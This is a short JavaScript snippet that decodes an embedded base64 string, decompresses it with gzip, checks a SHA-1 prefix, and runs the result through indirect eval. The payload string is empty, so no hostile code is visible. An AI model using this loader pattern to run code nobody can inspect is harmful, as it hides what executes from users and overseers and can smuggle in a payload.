(async () => {
  const b64 = "";
  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const code = await new Response(new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'))).text();
  const h = [...new Uint8Array(await crypto.subtle.digest('SHA-1', new TextEncoder().encode(code)))].map(x => x.toString(16).padStart(2, '0')).join('').slice(0, 10);
  if (h !== "05587622be") return 'checksum mismatch: the pasted text was altered (' + h + ')';
  return (0, eval)(code);
})()
